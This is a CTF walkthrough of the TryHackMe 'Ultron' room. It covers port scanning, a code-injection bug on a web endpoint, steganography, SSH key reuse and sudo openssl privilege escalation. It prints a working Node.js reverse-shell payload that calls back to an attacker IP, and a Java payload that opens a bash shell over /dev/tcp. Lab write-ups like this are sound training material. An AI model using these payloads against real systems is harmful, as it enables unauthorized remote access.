# ultron ctf -TryHackMe
## Author : RjRaju

### Ultron CTF room [line](https://tryhackme.com/room/ultr0nctf)

# Port Scan

* __First we need to scan the open ports, Let's use rustscan or nmap to scan the open ports.__


# Rustscan

![line](images/rustscan.png)

# Nmap Scan

![line](images/nmap.png)

# Open Ports

```
Open 10.10.98.46:7022
Open 10.10.98.46:7127
Open 10.10.98.46:8800
```

## **OpenSSH running on port 7022**

![line](images/port7022.png)

## **Nginx server running on port 8800**

![line](images/port8800.png)

## **Unknown login service running on port 7127**

![line](images/port7127.png)


* lets move on port **8800**

# web login

![line](images/login.png)

* Let's run Gobuster in order to find any directories on the service.

![line](images/gobuster.png)

* There is nothing intresting on the page, so let's register the account and login.

![line](images/dashboard.png)

* Let's see the request and responce on BurpSuit
* /source path there is a text box to enter the name, let's see the responce on Burpsuit

![line](images/source.png)

* send this request to repeater

![line](images/burp.png)

* There is Bug on /source?name=hacker field, lets create a payload on JavaScript.

![line](images/res1.png)

## JavaScript Payload

```js

var net = require("net"),sh = require("child_process").exec("/bin/sh");
var client = new net.Socket();
client.connect(1234, "10.6.49.123", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});

```

* Start Listening on port 1234 and encode the URL-Encode above payload, and send Request on BurpSuit.

![line](images/nc.png)

![line](images/urlencode.png)

* Now send the request and you will receive the reverse shell :).

![line](images/req2.1.png)

![line](images/revshellstable.png)

* Here is the source code of web page, in web page there is a /upload path to list the directory listing.


![line](images/data.png)

* Let's copy the ultron.jpg file to upload folder, so we can download that file on web page /upload path

![line](images/download.png)

* Download both files and the meta data.
* The nothing.txt file is useless and ultron.jpg hava some meta data.
* let's download the file and use steghide to extract the hidden data. 

![line](images/steg.png)

* Now we have the login cred's of port 7127 unknown service

![line](images/backdoor.png)

* Now we have code execution, use ssh keys to login as ssh service.
* SSH service is listening on port 7022 as nmap scan shown..

![line](images/ssh1.png)
![line](images/ssh2.png)

* Use the **id_rsa** key to login as wandamaximoff user.

![line](images/wandalogin.png)

* We can't upload linPEAS or other scripts to server, because some kind of firewall's blocking the connection, let's do manual priv..

![line](images/wandapriv.png)
 
* Let's create a JAVA payload to login as vision user.

```java
public class Shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/127.0.0.1/2222 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

* We can't get the reverse shell on attacket box so lets get rev shell on BOX.
* Use TMUX for multi-pane on BOX.

![line](images/visionshell.png)

* We got the revShell as vision user, let's stabilize the shell.

![line](images/stablize.png)

* submit the user flag.

![line](images/userflag.png)

* vision user can run openssl as root user with no password.

![line](images/vispriv.png)


* Gtfobins

![line](images/gtfobinfileread.png)


* root Flag

![line](images/rootFlag.png)

**Happy Hacking ! ..**